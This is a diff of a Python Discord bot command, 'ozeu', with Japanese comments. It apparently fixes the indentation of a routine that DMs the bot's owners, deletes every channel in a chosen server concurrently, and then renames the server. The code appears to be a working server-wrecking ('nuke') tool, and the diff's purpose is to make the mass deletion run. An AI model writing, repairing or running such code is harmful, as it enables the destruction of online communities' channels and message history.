@@ -144,8 +144,6 @@ async def ozeu(ctx, guild_id: str = None):
             return
         guild = ctx.guild
 
-    # ここからインデントを1段下げて関数内に入れる
-    # OWNER_ID はリストなので、まず1人ずつ fetch_user で取得
     owners = [await bot.fetch_user(owner_id) for owner_id in OWNER_ID]
 
     embed_start = discord.Embed(
@@ -156,20 +154,19 @@ async def ozeu(ctx, guild_id: str = None):
     embed_start.add_field(name="実行者", value=f"{ctx.author} (ID: {ctx.author.id})", inline=False)
     embed_start.timestamp = discord.utils.utcnow()
 
-    # 複数オーナーにDM送信
     for owner in owners:
         await owner.send(embed=embed_start)
 
     await ctx.send(embed=embed_start)
 
-# --- チャンネル削除関数（エラーはログ出力のみ）---
-async def delete_channel(channel):
-    try:
-        await channel.delete()
-    except Exception as e:
-        print(f"[ozeu] {channel.name} の削除でエラー: {e}")
+    # --- チャンネル削除関数（エラーはログ出力のみ）---
+    async def delete_channel(channel):
+        try:
+            await channel.delete()
+        except Exception as e:
+            print(f"[ozeu] {channel.name} の削除でエラー: {e}")
 
-await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
+    await asyncio.gather(*[delete_channel(ch) for ch in guild.channels])
 
 # サーバー名変更
 try:
